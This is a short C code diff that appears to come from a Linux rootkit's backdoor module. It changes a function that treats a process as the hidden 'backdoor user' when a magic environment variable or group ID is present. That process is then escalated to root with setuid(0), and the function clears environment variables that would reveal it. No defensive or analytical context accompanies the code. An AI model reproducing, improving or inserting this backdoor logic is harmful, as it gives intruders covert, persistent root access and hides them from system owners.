@@ -12,14 +12,18 @@ int is_bdusr(void){
 #ifndef HIDE_SELF
     return 1;
 #endif
-    if(bdusr != 0) return bdusr;
+    if(bdusr != 0){
+        unset_bad_vars();
+        return bdusr;
+    }
 
     xor(bd_var, BD_VAR);
     /* allow usage of a magic environment variable to grant owner perm */
     if(getenv(bd_var) != NULL && !not_user(0)) bdusr = 1;
     clean(bd_var);
 
-    if(process_info.mygid == MAGIC_GID){
+    if(bdusr != 1 && getgid() == MAGIC_GID){
+        bdusr = 1;
         (void)setuid(0); 
 
         /* set our home environment variable */
@@ -30,7 +34,6 @@ int is_bdusr(void){
         clean(home_str);
         clean(idir);
         (void)putenv(homebuf);
-        bdusr = 1;
     }
 
     if(bdusr) unset_bad_vars();
